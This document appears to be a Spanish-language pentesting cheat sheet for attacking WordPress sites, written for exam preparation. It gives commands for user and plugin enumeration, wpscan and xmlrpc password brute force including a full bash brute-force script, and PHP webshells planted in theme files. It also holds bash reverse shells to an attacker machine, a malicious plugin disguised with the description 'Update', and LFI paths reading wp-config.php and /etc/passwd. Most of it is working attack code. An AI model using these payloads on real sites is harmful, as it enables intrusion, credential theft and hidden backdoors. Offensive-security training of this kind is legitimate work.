# WordPress

Tags: #WordPress #CMS #WPScan #WPProbe #Enumeracion #FuerzaBruta #RCE #LFI #xmlrpc

## OBJETIVO
- Enumerar versión, usuarios, plugins y temas de WordPress
- Identificar plugins y temas vulnerables
- Obtener acceso al panel de administración
- Conseguir RCE desde el panel de admin o vía plugins vulnerables

## TIPS
1. **wp-config.php → siempre buscarlo → contiene credenciales de la DB**
2. **Plugin vulnerable → searchsploit + exploit-db → muy frecuente en el examen**
3. **Acceso al panel admin → editar tema 404.php → RCE inmediato**
4. **xmlrpc.php expuesto → fuerza bruta sin limitación de intentos**
5. **/wp-json/wp/v2/users/ → enumera usuarios sin autenticación si está habilitado**
6. **Aunque el WordPress esté actualizado → plugins desactualizados = vulnerable**

## RECURSOS
* [WPScan API Token](https://wpscan.com/register) → gratis para uso limitado
* [DVWP Lab](https://github.com/vavkamil/dvwp) → laboratorio práctico
* [Xmlrpc Abuse](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)

## 1. RUTAS Y ARCHIVOS CLAVE

### Rutas web importantes
```
/readme.html                     → Versión de WordPress
/wp-login.php                    → Panel de login
/wordpress/wp-login.php          → Instalación en subdirectorio
/wp-admin/                       → Panel de administración
/wp-json/wp/v2/users/            → Enumerar usuarios sin auth (JSON)
/wp-content/plugins/             → Directory listing de plugins
/xmlrpc.php                      → Si expuesto → fuerza bruta sin límite
/?author=1                       → Enumeración manual de usuarios
/?author=2                       → Incrementar para más usuarios
```

### Archivos críticos por consola
```
/var/www/html/wp-config.php           → Credenciales de DB → leer siempre
/usr/share/wordpress/wp-config.php    → Ruta alternativa
/etc/apache2/sites-enabled/wordpress.conf  → Configuración Apache
/var/www/html/wp-content/uploads/     → Archivos subidos → buscar webshells
/var/www/html/wp-content/plugins/     → Plugins instalados
/var/www/html/wp-content/themes/      → Temas instalados
```

### wp-config.php — Datos críticos
```bash
❯ cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"
# Credenciales de la base de datos → reutilizar en MySQL, phpmyadmin
# Con esas credenciales → http://IP/phpmyadmin → usuarios y hashes en la DB
```

## 2. ENUMERACIÓN INICIAL

### Identificar versión y tecnologías
```bash
❯ whatweb -a1 http://<IP>/
# Versión de WordPress, plugins, servidor

❯ curl -s http://<IP>/readme.html | grep -i "version"
# Versión directa desde readme.html

❯ curl -s -X GET http://<IP>/ | grep -oP 'ver=\K[\d.]+' | sort -u
# Versión desde el código fuente de la página
```

### Enumerar plugins y temas con curl
```bash
# Plugins instalados
❯ curl -s -X GET http://<IP>/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

# Filtrar solo el nombre del plugin
❯ curl -s -X GET "http://<IP>/" | grep -oP 'plugins/\K[^/]+' | sort -u
# Buscar cada nombre en searchsploit

# Temas instalados
❯ curl -s -X GET http://<IP>/ | grep -E 'wp-content/themes/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

### Enumerar usuarios manualmente
```bash
❯ curl -s -I -X GET "http://<IP>/wordpress/\?rest_route\=/wp/v2/users"
# Enumerarción manual 

❯ curl -s -I -X GET "http://<IP>/?author=1"
# Redirige al nombre del usuario → ver Location en cabeceras

❯ curl -s "http://<IP>/wp-json/wp/v2/users/" | python3 -m json.tool
# Lista usuarios en JSON → sin autenticación si está habilitado

❯ for i in {1..10}; do echo -n "author=$i: "; curl -s "http://<IP>/wordpress/?author=$i" -I | grep Location; done
# Iterar para encontrar varios usuarios
```

## 3. WPSCAN — ENUMERACIÓN COMPLETA

### Escaneo básico
```bash
❯ wpscan --url http://<IP>/
# Detección básica → versión, plugins, temas, usuarios

❯ wpscan --url http://<IP>/wp-login.php
# Escaneo desde el login
```

### Enumeración específica
```bash
❯ wpscan --url http://<IP>/wordpress/ --enumerate u --no-update 
# Enumerar usuarios sin actualizar la herramienta 

❯ wpscan --url http://<IP>/ -e u,vp
# -e u → usuarios | -e vp → plugins vulnerables

❯ wpscan --url http://<IP>/ -e u,vp,vt,dbe
# vt → temas vulnerables | dbe → bases de datos expuestas

❯ wpscan --url http://<IP>/ -e u,vp --plugins-detection aggressive
# aggressive → más completo | mixed → por defecto | passive → silencioso

❯ wpscan --url http://<IP>/ -e vp --api-token="<TOKEN>"
# Con API token → CVEs y detalles de vulnerabilidades
```

### Fuerza bruta de credenciales
```bash
❯ wpscan --url http://<IP>/ --passwords /usr/share/wordlists/rockyou.txt
# Fuerza bruta a todos los usuarios encontrados

❯ wpscan --url http://<IP>/wp-login.php -U users.txt -P /usr/share/wordlists/rockyou.txt
# Con lista de usuarios específica

❯ wpscan --url http://<IP>/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt
# Usuario conocido → buscar contraseña

❯ wpscan -t 20 --password-attack wp-login --url http://<IP>/ -U admin --passwords /usr/share/wordlists/rockyou.txt
# -t 20 → 20 peticiones por segundo

❯ wpscan -t 20 --password-attack xmlrpc --url http://<IP>/ -U admin --passwords /usr/share/wordlists/rockyou.txt
# Fuerza bruta vía xmlrpc → más rápido → sin rate limiting
```

## 4. WPPROBE

```bash
❯ wpprobe http://<IP>/
# Enumeración básica → plugins instalados

❯ wpprobe http://<IP>/ --enumerate
# Enumeración extendida → versiones de plugins

❯ pip3 install wpprobe --break-system-packages
# Instalar si no está disponible
```

## 5. XMLRPC.PHP — ENUMERACIÓN Y FUERZA BRUTA

Si esta expuesto, podemos enumerar credenciales validas y solo acepta peticiones por **POST** y que este estructurada en **XML**
* Debemos de listar los métodos y lo haremos con el código del archivo y ver si existe el siguiente **wp.getUsersBlogs** y después aplicar fuerza bruta.

### Verificar si está expuesto
```bash
❯ curl -s -X GET "http://<IP>/xmlrpc.php"
# Devuelve mensaje → confirma que está disponible (solo acepta POST)

❯ curl -s -X POST "http://<IP>/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
# Listar métodos → buscar wp.getUsersBlogs → permite fuerza bruta
```

### Listar métodos con archivo XML
```bash
❯ nvim file.xml
# Contenido del archivo:

	<?xml version="1.0" encoding="utf-8"?> 
	<methodCall> 
	<methodName>system.listMethods</methodName> 
	<params></params> 
	</methodCall>

❯ curl -s -X POST "http://<IP>/xmlrpc.php" -d@file.xml
# -d@ → usar archivo como body del POST
```

### Script de fuerza bruta via xmlrpc
```bash
❯ nvim xmlrpc_bruteforce.sh

#!/bin/bash 

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm; exit 1
}

# Ctrl_c
trap ctrl_c INT

tput civis

function createXML(){
	password=$1

	xmlFile="""
	<?xml version=\"1.0\" encoding=\"UTF-8\"?>
	<methodCall> 
	<methodName>wp.getUsersBlogs</methodName> 
	<params> 
	<param><value>omar</value></param> 
	<param><value>$password</value></param> 
	</params> 
	</methodCall>
	"""
	echo $xmlFile > file.xml
	response=$(curl -s -X POST "http://IP/xmlrpc.php" -d@file.xml)

	if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then 
		echo -e "\n[+] La contraseña para el usuario omar es $password"
		echo 0
	fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do 
	createXML $password
done 

❯ chmod +x xmlrpc_bruteforce.sh && ./xmlrpc_bruteforce.sh
```

---

## 6. OBTENER RCE — PANEL DE ADMINISTRACIÓN

### Opción 1 — Editar tema existente (más rápido)
```bash
# Appearance → Theme Editor → seleccionar tema activo → 404.php Template

Forma 1:
# Webshell para ejecutar comandos
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>


Forma 2:
# Reverse shell directa hacia Kali 
<?php system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'"); ?>


NOTA:
	# Despues de actualizar el template, enviar una petición para que se ejecute el código en:
		http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php
```

```bash 
Para la forma 1:
# Acceder al tema modificado
❯ http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php?cmd=whoami

Para la forma 2:
# Para reverse shell en Kali
❯ rlwrap nc -nlvp 443
```

### Opción 2 — Subir tema con webshell
```bash
# Descargar tema legítimo
❯ wget https://es-mx.wordpress.org/themes/hestia/ -O hestia.zip
❯ unzip hestia.zip

# Agregar webshell al tema
❯ echo '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>"; ?>' > hestia/cmd.php

# Recomprimir y subir
❯ zip -r hestia.zip hestia/
# Appearance → Themes → Add New → Upload Theme

# Acceder a la webshell
❯ http://<IP>/wp-content/themes/hestia/cmd.php?cmd=whoami
```

### Opción 3 — Plugin con reverse shell
```bash
❯ mkdir evil-plugin
❯ nvim evil-plugin/evil-plugin.php

Forma 1:
	<?php
	/**
	 * Plugin Name: Evil Plugin
	 * Description: Update
	 * Version: 1.0
	 */
	system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'");
	?>

o 

Forma 2:
	<?php
	/**
	 * Plugin Name: Evil Plugin
	 * Description: Update
	 * Version: 1.0
	 */
	if (isset($_GET['cmd'])) {
		system($_GET['cmd']);
	}
	?>


❯ zip -r evil-plugin.zip evil-plugin/
# Plugins → Add New → Upload Plugin → Install Now → Activate
# Al activar → ejecuta la reverse shell
```

```bash 
Para la forma 1:
# Para reverse shell en Kali
❯ rlwrap nc -nlvp 443
```

```bash 
Para la forma 2:
# Ejecutar comandos desde la webshell 
❯ http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=whoami

# Ejecutar comandos desde Kali 
❯ curl http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php\?cmd\=whoami
```

```bash 
Forma 3:
# Esta es la forma más profesional de hacerlo 

	<?php
	/**
	 * Plugin Name: Plugin
	 * Description: Update
	 * Version: 2.0
	 */
	 
	// Verifica si se recibieron los parámetros 'cmd' (comando a ejecutar)
	// y 'passwd' (contraseña utilizada para autenticar la webshell)
	if (isset($_REQUEST['cmd']) and isset($_REQUEST['passwd'])) {
	
	    // Inicia la etiqueta <pre> para mostrar la salida del comando
	    // respetando el formato original (saltos de línea y espacios)
	    echo "<pre>";
	
	    // Obtiene el comando enviado por el usuario
	    $cmd = $_REQUEST['cmd'];
	
	    // Obtiene la contraseña proporcionada por el usuario
	    $password = $_REQUEST['passwd'];
	
	    // Compara la contraseña ingresada con la contraseña/hash predefinido ('5e280cb0e45fb3171c53cd8dd49df47f')
	    // definido por el desarrollador de la webshell
	    if ($password === '5e280cb0e45fb3171c53cd8dd49df47f') {
	
	        // Ejecuta el comando del sistema operativo
	        // y envía la salida directamente al navegador
	        system($cmd);
	
		// Finalizaa la sección donde se muestra la salida del comando 
		echo "</prep>";
		
		// Termina la ejecución del script despues de mostrar la salida del comando 
		die;
	}
	?>
```

```bash 
Para la forma 3:
# Ejecutar comandos desde la webshell 
❯ http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php?passwd=5e280cb0e45fb3171c53cd8dd49df47f&cmd=whoami

# Ejecutar comandos desde Kali 
❯ curl http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php\?passwd\=5e280cb0e45fb3171c53cd8dd49df47f\&cmd\=whoami
```

### Opción 4 — Upload vía plugin vulnerable
```bash
❯ curl -F "Filedata=@./shell.php" http://<IP>/wp-content/plugins/wpstorecart/php/upload.php
# Requiere plugin wpstorecart vulnerable
# Acceder: http://IP/wp-content/plugins/wpstorecart/shell.php
```

---

## 7. LFI VÍA PLUGINS VULNERABLES

```bash
# Plugin IMDb Widget 1.0.8 → LFI en pic.php
❯ http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
# Descarga la imagen → cambiar extensión a .txt → leer contenido

❯ wget "http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php" -O output.txt
# Guardar directamente como .txt → leer el contenido

# Paths útiles para LFI en WordPress
../../../wp-config.php
../../../../etc/passwd
../../../wp-content/uploads/<archivo>
```

---

## 8. BUSCAR PLUGINS VULNERABLES

```bash
❯ searchsploit wordpress <nombre_plugin>
❯ searchsploit wordpress <nombre_plugin> <version>
# Buscar exploit por nombre y versión del plugin

❯ curl -s "http://<IP>/wp-content/plugins/<plugin>/readme.txt" | grep -i "stable tag\|version"
# Ver versión exacta del plugin instalado

# Con API token de wpscan → CVEs automáticos
❯ wpscan --url http://<IP>/ -e vp --api-token="<TOKEN>"
```

---

## FLUJO EN EL EXAMEN

```
1. whatweb + wpscan básico → versión WP e info inicial
2. wpscan -e u,vp --api-token → usuarios + plugins vulnerables
3. curl grep plugins → lista de plugins → searchsploit por cada uno
4. Plugin vulnerable → explotar directamente
5. Sin plugin → fuerza bruta al login o vía xmlrpc
6. Panel admin → Appearance → Theme Editor → 404.php → webshell/revshell
7. Shell obtenida → cat wp-config.php → credenciales DB → reutilizar
```
